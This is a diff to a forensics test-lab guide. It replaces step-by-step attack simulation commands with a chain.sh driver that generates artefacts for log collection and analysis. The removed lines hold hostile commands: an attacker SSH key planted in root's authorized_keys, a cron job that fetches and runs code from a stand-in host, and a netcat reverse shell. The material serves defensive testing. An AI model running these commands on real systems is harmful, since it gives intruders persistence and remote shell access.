@@ -261,28 +261,33 @@ Run everything on **one** CLEAN snapshot, in kill-chain order, then collect
 **once**. This is where correlations appear that no single-incident case can
 show.
 
-**Recommended order (one external attacker story):**
+**One command — `chain.sh` runs the whole kill chain in order:**
 
 ```sh
-# restore CLEAN, set clock
+# restore CLEAN, set the clock, then:
 cd testlab/scenarios
-export LFA_LAB_CONFIRM=yes
+sudo sh chain.sh                       # 02→01→05→07→06→03 on one snapshot
+# LFA_LIVE_SHELL=1 sudo sh chain.sh    # also leave a live reverse shell for ps
+```
 
-sudo sh 02_brute_force_ssh.sh          # 1. break in (burst + success)
-sudo sh 01_unauthorized_login.sh       # 2. off-hours foothold
-sudo sh 05_privilege_escalation.sh     # 3. escalate (backdoor accounts)
+`chain.sh` runs the stages below in kill-chain order, then **stops before
+collection** and prints the exact collect→analyse→verify→score block. The
+persistence stage is now scenario `07_persistence.sh` (SSH key + cron beacon),
+which the driver runs with no local anchor because scenario 02 already provided
+the brute-forced login that `persistence_after_login` correlates against:
 
-# 4. persistence — needed for persistence_after_login; add a key + cron tied to
-#    the brute-forced login window (203.0.113.9):
-sudo mkdir -p /root/.ssh && \
-  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIatt attacker@c2" >> /root/.ssh/authorized_keys
-( crontab -l 2>/dev/null; echo "* * * * * curl -s http://203.0.113.9/beacon | sh" ) | crontab -
+```
+1. 02  break in       brute-force burst + a success from the attacker IP
+2. 01  foothold       off-hours privileged action from that IP
+3. 05  escalate       backdoor accounts (uid0 / nopass / privileged group)
+4. 07  persist        SSH key in /root/.ssh/authorized_keys + /etc/cron.d beacon
+5. 06  execute        curl beacon / reverse-shell payloads
+6. 03  anti-forensics (optional 2nd actor) history wipe
+```
 
-sudo sh 06_suspicious_process_execution.sh   # 5. run the payload
-nc -e /bin/sh 203.0.113.9 4444 &             #    leave a live reverse shell for ps
-sudo sh 03_insider_activity.sh               # 6. (optional 2nd actor) collect + wipe
+**Then COLLECT ONCE** (the driver prints this for you):
 
-# 7. COLLECT ONCE
+```sh
 sudo sh ../../collector/collect.sh -o /tmp/out -c CASE-CHAIN -p "YourName" -z
 ```
 
